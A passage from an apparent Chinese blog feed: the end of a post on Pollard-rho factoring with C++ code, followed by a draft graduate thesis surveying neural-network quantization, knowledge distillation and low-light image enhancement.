<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(x,c,P)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x * x + c) % N;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> pollard-<span class="built_in">rho</span>(<span class="type">int</span> P)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">is_prim</span>(P))<span class="keyword">return</span> P</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">int</span> c = <span class="built_in">rand</span>() % (n - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> t = <span class="built_in">f</span>(<span class="number">0</span>,c,P);</span><br><span class="line">        <span class="type">int</span> r = <span class="built_in">f</span>(t,c,P);</span><br><span class="line">        <span class="keyword">while</span>(t != r)&#123;</span><br><span class="line">            <span class="type">int</span> ans = <span class="built_in">gcd</span>(<span class="built_in">abs</span>(t - r),P);</span><br><span class="line">            <span class="keyword">if</span>(ans &gt; <span class="number">1</span>)<span class="keyword">return</span> ans;      </span><br><span class="line">            t = <span class="built_in">f</span>(t,c,P);</span><br><span class="line">            r = <span class="built_in">f</span>(<span class="built_in">f</span>(r,c,P),c,P);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 没有找到因子，重新选取P</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>gcd优化,使用倍增方案</li>
</ol>
<p>若<span class="math inline">\(gcd(x,P) \neq 1\)</span>，<span
class="math inline">\(gcd(y,P) \neq 1\)</span>，则<span
class="math inline">\(gcd(xy,P)\neq 1\)</span><br />
由于gcd的时间复杂度为log，为了能减少gcd的次数，基于上式子可以将多个<span
class="math inline">\(|x_{i} -
x_{j}|\)</span>连乘，与P做gcd，会找到因式，同时减少了gcd的次数</p>
<p>我们可每隔<code>1，2，4，8 ...</code>个数连乘一下，这样求解gcd的次数变为<span
class="math inline">\(log(P^{\frac{1}{4}})\)</span>次，所以总时间复杂度变为<span
class="math inline">\(O(P^{\frac{1}{4}} +
log(P^{\frac{1}{4}})log(P))\)</span>，连乘法注意取模，因为gcd(a % P, P)
= gcd(a,P);取模防止连乘的数过大。</p>
<p>上述方案依旧有一定缺陷，遇到后面计算一次gcd的时间越大，所以也可以将相隔距离从指数的距离改为固定距离C，时间复杂度变为<span
class="math inline">\(O(P^{\frac{1}{4}} +
\frac{P^{\frac{1}{4}}logP}{C})\)</span>，当<span class="math inline">\(C
&gt; log(P)\)</span>时，时间复杂度为<span
class="math inline">\(O(n^{\frac{1}{4}})\)</span></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">Pollard_Rho</span><span class="params">(ll N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">4</span>)     <span class="comment">// 注意特判一下</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">is_prime</span>(N))</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ll c = <span class="built_in">randint</span>(<span class="number">1</span>, N - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">auto</span> f = [=](ll x) &#123; <span class="built_in">return</span> ((lll)x * x + c) % N; &#125;;</span><br><span class="line">        ll t = <span class="number">0</span>, r = <span class="number">0</span>, p = <span class="number">1</span>, q;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; ++i) <span class="comment">// 令固定距离C=128</span></span><br><span class="line">            &#123;</span><br><span class="line">                t = <span class="built_in">f</span>(t), r = <span class="built_in">f</span>(<span class="built_in">f</span>(r));</span><br><span class="line">                <span class="keyword">if</span> (t == r || (q = ((lll)p * <span class="built_in">abs</span>(t - r)) % N) == <span class="number">0</span>) <span class="comment">// 如果发现环，或者积即将为0，退出，注意这里使用等式gcd(a % b,b) = gcd(a,b)</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = q;</span><br><span class="line">            &#125;</span><br><span class="line">            ll d = <span class="built_in">gcd</span>(p, N);</span><br><span class="line">            <span class="keyword">if</span> (d &gt; <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">        &#125; <span class="keyword">while</span> (t != r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>数学</tag>
        <tag>概率算法</tag>
      </tags>
  </entry>
  <entry>
    <title>paper_graduate</title>
    <url>/2023/10/27/paper-graduate/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/132561405">参考1</a></p>
<p>[]</p>
<h1 id="摘要">摘要</h1>
<p>暗光增强在多种领域有所应用，如视频监控，自动驾驶等，尤其是智能手机，其光圈较小、实时处理要求高、内存较小，在智能手机上实现暗光增强功能具有很大的挑战性。</p>
<h1 id="介绍">介绍</h1>
<p>近些年，深度神经网络越来越多的用于一些边缘设备上，一些边缘设备仅能提供较低的计算能力，并且在功耗和散热上有一些限制，需要一种算法来解决这样的问题，量化成为部署算法的主要方法之一。
## 量化国内外发展现状
在最近几年，由于工业界的需要网络量化发展的迅速，从最开始的在精度要求低的图像检测、识别任务上向精度要求高的任务开始过渡。工业界和学术界涌现了各种各样的量化方案，从2，3bit的低位量化到8bit量化，再到后来的多位量化，以及非均匀的对数量化。不同量化方式计算方法不同，这也促进了一些AI芯片的发展，现在的一些芯片可以很好的支持多种低位整数运算Imagination推出两款AI芯片IP内核AX2185与AX2145，能够支持16bit～4bit位宽，主打手机、智能监控、汽车等市场。量化方法已经在学术界给出了大量方案。
Guo,Zhang等人[1]提出了混合精度量化的相对与int8等固定精度量化来说主要问题在与位数选择，神经网络结构（NAS）方法用于网络结构的搜索，我们可以将量化位数当作一个模型结构参数，通过NAS方法搜索最佳网络,但是这种方法主要是计算量大，收敛速度和计算所需资源都极大。Yu,Han等人[2]借鉴了NAS搜索方法，但是减少了NAS的计算代价，通过为每种量化方式加权并将权重使用网络进行训练，最终权重最大所对应的网络位数即为选择位数，虽然计算量减小了，但是目前仅在图像识别和检测任务上进行了测试。H.Yang,L.Duan等人[3]提出一种新颖的方法，将量化位数大小转为二进制使之每一位成为可训练的变量，使得量化位数可通过网络优化得到。本方法很好的计算了网络权重层的量化位数，但是却未能对权重层输出的特征进行量化。Z.Dong,Z.Yao等人[4]提出使用海森矩阵统计的方式进行量化位数计算的方法，通过计算某层参数量化后平均意义上的误差来选择某层的量化位数。方法偏向于数学理论，但是其衡量量化误差仅从参数层面，量化方法层面没有考虑。R.Gong,X.Liu等人[5]提出一种使用tanh拟合取整函数的方法，使得反向传播不再使用传统的STE（straight-through
estimator）来进行估计损失，网络训练出来的参数更加合理，文中仅对固定为数量化进行了实验。C.Hong,H.Kim等人[6]提出了一种对于超分网络的量化方式，由于超分网络任务更加难，所以量化过程中需要降低量化对网络的损失，文中提出一个估计量化后网络损失的方法，将其作为正则项，利用网络自身训练减少损失。但文中提出的损失估计也仅仅是从权重量化损失层面上得到的，并没有考虑权重层的输出。李博闻[7]提出乐一种无训练数据量化方案，是得对于一些数据集不公开的网络也能进行量化</p>
<h2 id="蒸馏国内外发展现状">蒸馏国内外发展现状</h2>
<p>传统知识蒸馏仅仅达到了教师网络和学生网络之间的特征匹配，但是同一网络中不同特征之间的关系也是在网络推导时一个比较重要的信息，Yim等人（2017）年提出了关于基于关系的知识蒸馏方法的求解流程（FSP），其总结了特征图间的关系，使用两层特征之间的内积做计算，使用奇异值分解出特征图的关键信息进行知识蒸馏，Lee
et等2018年使用多个教师网络进行知识蒸馏，zhang和Peng（2018）使用多个教师网络的特征进行蒸馏，但是每个蒸馏的特征使用的是logits进行加权，形成一个蒸馏的多路计算图，每一个教师网络的蒸馏计算图根据logits中的权重不同而拥有不同的重要性。Lee和Song（2019）提出了基于多头图的知识蒸馏方法，通过多头注意力网络中的任意两个特征图之间的数据关系进行知识蒸馏。You等人2017，Park等人2019，Liu等人2019提出一种基于实例关系图蒸馏方法，关系图传递的知识包括层特征，层关系和跨层特征空间变换,Park等人提出一种基于流式学习的方案，通过特征嵌入对教师网络进行学习，保留了教师网络中渐层的特征相似性，Tung和Mori，2019提出一个相似保留知识的提取方法，将相似的激活值产生相似的知识层关系转移到学生网络中。Peng等人2019年提出一种蒸馏方法，其知识即包含相关的特征信息，又包含特征之间的相关性信息。
(只是蒸馏pdf 7,)</p>
<p>(知识蒸馏pdf 8,蒸馏方法) ## 量化蒸馏国内外发展现状 Yoojin Choi,
Jihwan Choi, Mostafa El-Khamy, Jungwon Lee; Proceedings of the IEEE/CVF
Conference on Computer Vision and Pattern Recognition (CVPR) Workshops,
2020, pp. 710-711
Yoojin等人提出了无数据的对抗性知识蒸馏，它最小化了来自生成器的任何对抗性样本的教师和（量化）学生的输出之间的最大距离。但是主要工作还是在目标检测网络中</p>
<p>QKD: Quantization-aware Knowledge Distillation
Kim等人提出了量化与知识蒸馏相结合来解决模型压缩问题，使用了三个阶段训练，自学习阶段对没有的量化低精度学生网络进行微调，以获得良好的初始化。其次，共同学习阶段训练一名教师。最后，辅导阶段将知识从受过培训的教师转移给学生。但是</p>
<p>Model compression via distillation and quantization
Polino等人提出了两种新的压缩方法，联合利用权重量化和将较大的教师网络蒸馏为较小的学生网络。第一种方法称为量化蒸馏，在训练过程中利用蒸馏，将相对于教师表示的蒸馏损失合并到学生网络的训练中。第二种方法是可微量化，通过随机梯度下降优化量化点的位置，以更好地拟合教师模型的行为。量化的浅层学生可以达到与全精度教师模型相似的准确度水平。</p>
<p>PQK: Model Compression via Pruning, Quantization, and Knowledge
Distillation</p>
<p>kim等人提出了一种新颖的模型压缩方法，称为pqk，由剪枝、量化和知识蒸馏过程组成。与传统剪枝和蒸馏不同，pqk利用剪枝过程中剪枝的不重要权重来制作教师网络，用于训练更好的学生网络，而无需预先训练教师模型。
pqk有两个阶段。第一阶段利用迭代剪枝和量化感知训练来创建轻量级且节能的模型。在第二阶段，我们通过将第一阶段中未使用的不重要权重添加到修剪后的网络中来创建教师网络。通过使用这个教师网络，我们将修剪后的网络训练为学生网络。这样不需要为蒸馏框架预先训练教师网络，因为教师网络和学生网络共存于同一网络中。但是这样无法再原先未量化得工作上建立更好的结果。</p>
<h2 id="暗光成像国内外发展现状">暗光成像国内外发展现状</h2>
<p>由于一些不可避免的环境限制，如光线不足，曝光时间较短，光线不均匀等，在这种条件下拍摄的图片美感受损，同时这种图片对于后续的算法，如对象跟踪，识别检测之类的任务可能效果较差，使用暗光增强网络来处理图片是解决此类问题的一种手段，
传统的用于暗光增强的方法有直方图均衡化，基于Retinex方法，后者关注相对较多（暗光综述pdf，第一张的第二段）。基于Retinex模型的方法通过一些先验或者使用正则化将暗光图像分解为反射分量和照明分量，其中估计的反射分量是增减结果的参考，但是这种方案是有一定问题的，因为将反射分量视为增强结果的假设不一定成立，如果碰到一些比较特殊的光照，这种增强可能会导致不正常的结果，例如细节丢失或者颜色失真，同时由于暗光条件先图像的噪声会很大，而在增强过程中保留了并放大了噪声。而且Retinex优化时间较长，同时找到一个合适的分解图像的正则化或者先验比较困难，所以有一些局限性。</p>
<p>自从深度学习发展壮大，人们开始转向使用深度学习解决暗光增强问题，与传统方法相比，深度学习方法具有更好的速度、鲁棒性和准确性，于是越来越受到关注。自2017年以来，深度学习的解决方案数量逐年增加，主要使用的策略有监督学习、强化学习、无监督学习、零样本学习、半监督学习。</p>
<p>对于监督学习的暗光增强方法，可以分为端到端、基于深度Retinex以及实际数据驱动的方法，第一类方法中LLNet[1c]使用stacked-sparse降噪自动编解码器[56]去给暗光图像提亮以及降噪。这个开创性的工作启发了后人使用端到端网络去处理暗光增强问题,Lv等人[3]提出了端到端多分支增强网络（MBLLEN），MBLLEN提高了LLIE（Low-light
Image
Enhancement）的性能，其使用特征抽取模块、特征增强模块以及特征融合模块抽取有效的特征，Lv等人[15]之后再次做出改进，使用三个网络完成暗光增强，分别有光照网络，融合网络以及恢复网络来进一步提高性能。Ren等人[12]设计了更为复杂的网络，使用图像增强的编码器-解码器结构的网络以及图像边缘增强的递归神经网络。与Ren等人[12]类似，Zhu等人[16]提出了一(edge-enhanced
multi-exposure fusion
network)EEMEFN方法，EEMEF方法包括两个阶段：多曝光融合和边缘增强，其产生的两个分支可以获得两套增强的结果，最后采用简单的平均方案将两个增强之后的结果进行融合并通过一个细化单元对结果进行进一步的细化。一些人也在LLIE的结构上引入了金字塔网络（LPNet）[18]，残差网络[19]，拉普莱斯金字塔网络(DSLR)[21]，来优化性能。这些方案通过LLIE常用的端到端的结构高效的集成特征表示。对于暗光下他图像噪声的问题，Xu等人[57]对不同频率的噪声进行了不同对比度的观察，提出一种按照频率的大小来分解图片再增强图片的方法，在低频中恢复具有噪声的图像内容，并推理出高频的细节以完成暗光增强。
[23]提出了一种渐进式递归（progressive-recursive）暗光图像增强网络，其使用递归方法逐渐的增强输入图像。为了解决暗光下视频的不稳定，zhang等人提出学习单张图片的运动情况来强化视频在图像上的稳定性。Chen等人2018[learining
to see in
dark]年提出使用raw图像进行暗光成像网络的训练，来解决isp中间过程造成信息丢失的问题，并且提供了相应的数据集。Xing等人[Abandoning
the bayer-filter to see in
dark]使用彩色处理网络和单色处理网络结果融合并引入注意力模块将Chen等人的工作进一步的提生了效果。</p>
<p>由于有相关的可解释的物理基础，基于Retinex的深度学习方法也成为了一个流派，基于Retinex的方法通常将网络功能划分为计算照明图的网络和计算反射率的网络，使用两类分量进行暗光图像增强。[4]提出了retinex-net，网络将一个输入输出成两部分，一个是与光照无关的反射率图，另一个是照明图，和一个使用照明图进行暗光增强的网络。后来retinex-net通过添加新的一些限制和更加先进的网络设计，获得了更好的网络增强效果。为了减轻计算量，Li等人[5]提出了一种解决暗光增强的轻量级网络LightenNet，网络由四层组成，LightenNet将暗光图像作为输入，然后估计其照明图。将输入图像和照明图进行处理得到暗光增强之后的结果。Wang等人[60]提出了DeepUPE网络结构，DeepUPE提取全局和局部特征来学习图像照明的映射。Zhang等人[11]分别开发了三个网络，用于层分解，反射率调整，以及光照的调整，称之为KinD。此外作者通过照明的多尺度注意力模块减轻了KinD结果中存在的缺陷。为了解决基于Retinex的神经网络没有处理噪声的问题，Wang等人[10]提出了一种渐进式Retinex网络，使用两个网络，一个估计照明，另一个估计噪声，两个网络使用渐进的机制进行工作，直到能获取比较稳定的结果。Fan等人[14]结合了语义分割以及Retinex模型，提高了网络在真是场景下的增强新能，核心思想史使用语义信息的先验知识来知道增强时使用的照明分量和反射分量。</p>
<p>由于一些暗光数据的拍摄比较困难，所以一些方法使用了强化学习、无监督学习、零样本学习、半监督学习。Yu等人[25]提出使用强化学习来学习曝光照片，首先根据曝光情况将输入图像分为多个子图像。网络对每个子图像使用强化学习学习局部曝光，使用对抗性的学习来作为奖励评估函数，最后使用每个局部曝光的结果对输入进行合成，进而获得不同曝光下的合成图片，最终通过融合这些合成图片来实现暗光增强。在一些成对的数据集中进行训练可能会出现过拟合和泛化能力不强的问题，[26]提出了EnligthenGAN的无监督学习方法。器材作用注意力机制来引导Unet网络作为生成器，使用全局和局部的鉴别器来保证暗光增强之后的结果和正常的真实光照一致，其提出的全局和局部特征保持损失函数可以保证增强前后的图像内容不会有损失。零样本学习主要的使用不成对的数据进行训练，Zhang等人[27]提出了一种零样本学习方法ExCNet，其首先使用网络估计最适合于暗光图像的S形曲线，确定S曲线之后，使用一个引导滤波器将整个输入图像分成基本层和细节层，然后使用S曲线调整基本层，使用Weber对比度[65]来融合细节层和经过处理之后的基本层来得到暗光增强的图像。Zhu等人[29]提出了一种三分之CNN网络，叫做RRDNet，通过对输入图像分解为照度、噪声以及反射率来进行增强。为了结合无监督学习和监督学习的优势，有人提出了半监督学习的暗光增强方法，Yang等人[33]提出了一种半监督深度递归网络（DRBN）。DRBN首先使用监督学习完成增强图像的线性表示，然后通过无监督对抗学习来重新组合给定线性的线性表示来改进表示方法，并且DRBN引入长期记忆网络实现了更好的性能。</p>
<p>在众多暗光增强方法中监督学习目前还主要是主流方案，本文也采用监督学习的暗光增强方法进行量化研究。</p>
<h2 id="本文主要工作">本文主要工作</h2>
<h2 id="相关章节安排">相关章节安排</h2>
<h1 id="相关理论研究">相关理论研究</h1>
<p>量化与蒸馏方法是本工作的重点，量化框架会分别实现量化与蒸馏的相关算法，来辅助完成本工作。在这里介绍一下蒸馏与量化的相关理论</p>
<h2 id="量化">量化</h2>
<p>在过去的几十年里，神经网络通过增大参数量来实现了对复杂问题的有效解决，虽然效果有所提升，但是这些模型的参数量问题使得其不能很好的部署在资源首先得设备上，这为实现深度学习的普及带来了问题，此类学习应该在资源受限制的环境下以保证任务的正确性，这将对自动驾驶，医疗监控，安防等各个需要深度学习的领域带来不小的帮助。神经网络的步数已经有大量文献在此方向上做努力，主要可以分为三个方法：量化、剪枝、蒸馏，一般在嵌入式设备部署网络之前会选择使用量化方法，主要是量化是专门为硬件部署方案设计的，其次是剪枝虽然会去除不必要的权重层，但是这样做会有一定降低网络效果的可能性，蒸馏的话更需要工程师设计出更好的网络结果，如果设计不好依旧会导致网络不能达标，因为部署前最省力的办法是使用量化压缩模型。</p>
<p><a
href="Robert%20M.%20Gray%20and%20David%20L.%20Neuhoff.%20Quantization.%20IEEE%20transactions%20on%20information%20theory,44(6):2325–2383,%201998.">参考文献1</a></p>
<p>在数学中，量化使用数值近似的方案处理连续数学量问题，这个领域有很悠久的历史，随着计算机的出现，这个问题也一起了人们的一些兴趣，在数值分析中，有时为了解决一些数学问题，使用某些理想化的解法为参照来准确实现该计算机算法得到的结果并不理想，因为在算法运行的过程中存在舍入和截断误差，这些舍入和截断误差主要和用于计算的数据仅用有限个比特表示有关，例如IEEE规定的对数据的表示。为了解决这些算法实现问题，有相关的学科给出了一些答案。</p>
<p>毫无疑问，现在已有大量关于神经网络量化问题的论文，这些量化问题可以说是对以前的数学上的量化问题的扩展与重新认识，神经网络给量化带来了机遇和挑战。首先，目前大多数神经网络参数都比较大，极有可能造成参数过于冗余，因此有很大可能性出现在不影响最终网络效果的条件下降低精度，其次神经网络多数是矩阵运算，其推理与训练是计算密集型，数值的有效表示尤为重要，</p>
<p>量化主要目的在于减小计算量，缓解机器中的缓存消耗从而降低算法可部署机器算力的下限。主要原理是使用定点数运算代替浮点数，例如32位浮点数运算代替8位定点数去做运算，计算量会大大减少，推理速度也会提升，google曾做过统计，使用cpu或者dsp进行浮点数推理和定点数推理时间能相差2-3倍，如果使用向量处理器的话，因为其单指令多数据流的操作方案可以很轻松的实现向量操作，进而速度能提升近10倍。但是，虽然量化带来了诸多好处，却因为参与计算参数的位数降低导致整体计算结果变差，为了缓解这种变差的趋势，需要先了解量化的运算过程，才能了解量化应该在什么地方优化。</p>
<h3 id="量化的基本思路">量化的基本思路</h3>
<p>再众多量化方法中，量化的一些基本概念是共通的，本文也是使用如下的一些量化技巧来完成量化，下面简要介绍下量化相关的一些基本思路。</p>
<h4 id="量化的主流方法">量化的主流方法</h4>
<ol type="1">
<li>二值化</li>
</ol>
<p>二值化的方法简单粗暴，计算参数只有0、1，使用异或运算和移位运算来代替卷积中代价较高的乘法和加法，一般适用于arm平台。近年来，有许多二值化神经网络方法被提出，从开始的使用确定的函数对权重和输入量化的朴素方法，到从多角度优化量化参数的方法，如通过修改损失函数来来限制权重，通过修改网络结构减小信息量损失，通过减小梯度误差进行训练，最小化量化误差。但是由于模型二值化之后模型精简太多，对于暗光增强等图像增强这种需要更多信息量的任务效果并不是很好。二值化的朴素做法：</p>
<p><span class="math display">\[
Q(x) = sgn(x) = +1 (x &gt;= 0), -1 (x &lt; 0)
\]</span></p>
<ol start="2" type="1">
<li>线性量化</li>
</ol>
<p>一种较为常见的方法，通过确定零点和映射尺度来进行量化计算。在arm，x86，英伟达gpu等架构的芯片上都支持8位定点数运算，由于线性量化的计算方式的问题，其量化与反量化的过程都是向量操作，使用向量处理器能更好的提升性能。虽然现在低位数的量化方案层出不穷，但是限于硬件，低位运算的开发板需要更多的开发周期，一般工业上部署主要是使用8位以上的量化。</p>
<ol start="3" type="1">
<li>对数量化</li>
</ol>
<p>对数量化是通过位移运算来加速推理的，将每一个参数视为一个以2为底的指数，在实际推理过程中指数的运算可以看做是移位运算，
<a
href="https://blog.csdn.net/qq_20759449/article/details/104733457">对数量化相关文章</a>
<a
href="https://pic2.zhimg.com/80/v2-a4f481df63477b7af50dcf571d3121ad_720w.webp">对数量化</a></p>
<h4 id="线性量化的数学原理">线性量化的数学原理</h4>
<p>由于本文使用线性量化方案，所以在这里主要介绍线性量化。线性量化主要有两组参数，一组用于控制映射后参数变化范围，叫做scale，另一组用于映射之后数据的原0点映射完之后变为什么值，这个变量叫做<span
class="math inline">\(zero\_point\)</span>
于是两户使用如下公式即可完成： <span class="math display">\[
    x_{ori} = x_{scale} \times (x_{quant} - x_{zero\_point})
    x_{quant} = round(x_{oir} / x_{scale}) + x_{zero\_point}
\]</span></p>
<figure>
<img src="参数解释.png" alt="数解释" />
<figcaption aria-hidden="true">数解释</figcaption>
</figure>
<figure>
<img src="float_to_int_map.png" alt="浮点数映射成定点数" />
<figcaption aria-hidden="true">浮点数映射成定点数</figcaption>
</figure>
<p>现在这只是进行了映射，映射后的结果进行计算之后应该如何参与运算呢，这里以两个浮点数做乘法为例讲解整个过程
<img src="quant_calculate_method.png" alt="quant_calculate_method" />
可以看到，除了几个scale参数外其他参数都是定点数，浮点数可以提前计算出来，放在模型里，这样在模型做推倒的时候可以很方便的拿来使用。</p>
<p>在实际生产环境中，可能一些定点数运算可能会超出8位整数，所以运算中的寄存器位数会比8位要多，防止出现溢出。同时我们将映射之后的位置使用<span
class="math inline">\(zero\_point\)</span>标定是有意义的，因为网络中有可能会进行0填充等涉及0的一些常见操作，这样的设计会使得，量化方案损失更小。</p>
<p><a href="https://zhuanlan.zhihu.com/p/505570612">参考资料</a></p>
<h4 id="量化的一些细节">量化的一些细节</h4>
<h5
id="逐层量化逐通道量化和分组量化">逐层量化、逐通道量化和分组量化</h5>
<p>在大多数计算机视觉任务中，层的激活输入和许多不同的卷积滤波器进行卷积，由于卷积中卷积层因为通道数量有很多，每个通道对应一个卷积核，卷积计算时需要每一个卷积核的计算相互独立，同时每一个卷积核的数据分布是不同的，所以量化时，对于卷积等内部有计算相互独立的参数有逐层和逐通道量化。</p>
<ol type="1">
<li>逐层量化</li>
</ol>
<p>将神经网络中的某一层中参数视为一个整体，通过相应的统计方法计算出一个量化相关的参数，例如层中最大值，最小值等，但是这个参数是关于神经网络整个一层的。这种方法看起来简单但是可能会导致次优的精度，因为两个卷积核的分布可能不一致。</p>
<ol start="2" type="1">
<li>逐通道量化</li>
</ol>
<p>将神经网络中的独立运算参数，利用相应的统计方法计算出一个量化相关的参数，但是一层里面会有一组参数，分别对应各个通道的量化方案，这样呢嗯呢该使得量化的粒度更细。其优点在于因为量化区间更加灵活，有助于在不同卷积核之间的参数分布变化很大的情况下使用，对网络精度会有一定提升，但缺点就是需要额外的量化参数存储开销</p>
<ol start="3" type="1">
<li>分组量化</li>
</ol>
<p>逐通道量化和住蹭了量化各有利弊，为了中和其中的利弊出现了逐通道量化，将多个通道分组，来计算裁剪范围，这种量化方法在有全连接的注意力层组成的transformer模型中是有用的。</p>
<p>如果不计存储成本的话，那么逐通道方法是推荐使用的，本文在量化感知训练中，卷积层的量化就使用了逐通道量化。</p>
<h5
id="对称量化非对称量化和随机量化">对称量化、非对称量化和随机量化</h5>
<ol type="1">
<li>对称量化</li>
</ol>
<p>对称量化比较简单，直接将<span
class="math inline">\(zero\_point\)</span>指定为0，之后观察计算表达式，可以发现
<img src="对称量化计算量.png" alt="对称量化计算量" />
这样很方便使用向量处理器做矩阵运算。
表达式中少了两次运算。但是会带来一些其他的问题，例如relu激活函数的到的值都是非负值，这个时候量化需要考虑使用有符号量化还是无符号量化</p>
<ol start="2" type="1">
<li>非对称量化</li>
</ol>
<p>非对称量化就是刚刚提到的<span
class="math inline">\(zero\_point\)</span>不指定为0的情况，这种量化方案更加灵活，但是会带来一些额外的储存开销，模型中必须保存零点运算相关参数，同时分析量化计算表达式也可以知道，如果<span
class="math inline">\(zero\_point \not =
0\)</span>将会导致一些额外的计算开销。</p>
<p>当然两种量化方案可以混合使用，可以对weight使用对称量化，而对activation使用非对称量化以达到性能的均衡。</p>
<ol start="3" type="1">
<li>随机量化</li>
</ol>
<p>随机量化将量化器建模为加性噪声，然后进行舍入。随机量化器由下式给出</p>
<figure>
<img src="suiji_quant.png" alt="suiji_quant" />
<figcaption aria-hidden="true">suiji_quant</figcaption>
</figure>
<p>可以看到在量化的过程中加入了噪声，加入噪声的原因是实际推理中输入是随机的，所以为了得到鲁邦性能较强的浮点数权重需要引入随机误差，这导致了权重会随着batch的不停而发生变化，在训练的开始随机量化效果会很差，但是在后续的训练过程中会弥补这一问题，但是由于量化过程中引入了随机数，一般的硬件不支持这样的推理，所以这种方法并不实用</p>
<h5 id="混合精度量化和单精度量化">混合精度量化和单精度量化</h5>
<p>量化可以根据精度使用情况来分类，量化过程中如果一些位数使用是多种情况的，比如3,4,5位等情况，这时的量化时混合精度量化，如果量化位数是固定的就是单精度量化，当前学术界对于混合精度量化研究比较多，但是工业上使用较多的是单精度量化，原因是单精度量化在开发板上比较容易实现，工程开发和硬件实现难度较低，但是混合精度量化需要处理器同时支持多种位数的整数计算，在硬件设计上难度较大，并且在代码设计上需要不断的考虑数据类型转换，会增加工程的复杂性。</p>
<h4 id="量化训练的方法">量化训练的方法</h4>
<p>前面我们说了一些量化的分类，在实际部署模型中，理论方法确定是一方面，另一方面是执行方案。量化推理已经有充足得理论支撑，但是量化中关于某个模型得一些具体量化参数应该怎样确定是一个需要解决的问题，本文就是来解决这样的问题的，现在有多种多样的算法，其计算推理方式都如上所示，但是不同方法的不同之处在于如何确定好scale和zero_point。</p>
<h5 id="量化后训练和训练后量化">量化后训练和训练后量化</h5>
<p>量化后训练和训练后量化如其名字一般，一个是先训练然后在量化，一个是先量化然后再训练。</p>
<p>训练后量化是一种通过32位浮点数网络经过训练得到比较好的结果之后,然后对得到的模型进行量化参数确定，好处就在于，对于一个模型不需要他人的训练代码，不需要他人数据集和标签，只需要模型就能进行量化，对于一些涉密等未公开的工作可以使用。训练后量化的一种简单实现就是直接降低权重的精度到8位，因为质量化权重，不涉及输入参数的量化，所以这种方法不需要数据集，操作十分简单。当然这种方法的缺点就是该方法不能将量化模型训练的很好，正确率较低，对于一些低bit量化很有可能达不到理想的效果，主要是因为在量化的过程中引入的误差没有在训练的时候考虑到。</p>
<p>这中训练后量化由于会发生效果较差的问题，所以有一些调优的办法,
以下过程能帮助我们了解模型效果差通常是出现在哪些地方。</p>
<ol type="1">
<li>推理流程结果检查：</li>
</ol>
<p>一个重要的部分就是保证32浮点数模型和量化后模型在推理结果能比较一致，将量化模型设置为32位进行推理和原模型进行对比，必要的时候可以查看两者层间结果的匹配程度。</p>
<ol start="2" type="1">
<li>位数变化检查：</li>
</ol>
<p>通过对激活值以及权重值位数的影响来判断，位数的变化对于性能提升是否有很大影响，如果有比较大的影响，说明性能瓶颈就在位数上。</p>
<ol start="3" type="1">
<li>逐层分析</li>
</ol>
<p>将某一层量化保留，其余层还原为32位，查看量化之后的效果，通过这种单独查看某一层量化效果来观察是否所得结果是可接受的，以此来判断某一层量化是否合理。</p>
<ol start="4" type="1">
<li>可视化分析</li>
</ol>
<p>如果确定是某一层的问题，也可以使用张量分析，查看权重和激活值的张量分布，进一步确定问题所在的地方。</p>
<figure>
<img src="a量化训练流程.png" alt="a量化训练流程" />
<figcaption aria-hidden="true">a量化训练流程</figcaption>
</figure>
<p>针对训练后量化的问题，有人提出了量化感知训练，量化感知训练是一种通过在训练神经网络过程中引入模型量化误差来寻找最优解的一种方法，这种方式训练出的量化方案更为灵活，量化前还需要计算激活值的数据分布，从而计算出激活值的量化参数，一般来说100batch就能很好的统计出激活值的数据分布。</p>
<p>google对于一些量化基础方法进行了实验，在量化感知训练中，逐通道的量化是效果最好的，因为权重的量化精度损失会比较小，同时逐层量化效果性能较差，激活值的8bit量化精度损失比较小，参数较多的网络量化损失比较小.</p>
<p>总的来说，量化感知训练会使网络输出准确性有所提升，但是其一大缺点就是实现起来不方便，由于需要模拟量化计算，量化感知训练需要手动实现一些网络层，然后再训练过程中进行替换，并且需要进行一些训练逻辑的确定，对于一个网络的量化需要很多工作量，本文使用了pytorch.fx技术可以很好的避免这一情况。</p>
<h5 id="量化数据的统计">量化数据的统计</h5>
<p>网络中数据按照每次模型推理输入数据的不同可以分为两种，一种是对于每次输入都不变的权重weight，另一种是在网络中随输入改变而改变的activation，activation实际上是网络中各个层计算出来的结果，在进行量化推理的时候两种参数都需要进行量化和反量化，考虑到weight在部署时参数会固定，所以weight量化参数很好确定，一般使用weight的最大值和最小值表示量化的区间即可，但是由于网络中的activation会根据输入的不同而不同，对于activation的量化可以采用统计等方案进行，统计中也有一些算法，比如统计activation的分布，然后去除前后3%的参数，剩余的部分为量化的范围
<img src="activation.png" alt="activation_calculate" />
当然还有一些其他的统计方案，主要还是为了能更好的将模型中的参数在量化之后能均匀的分布在[-128,127]之间。</p>
<h5 id="如何进行梯度反向传播">如何进行梯度反向传播</h5>
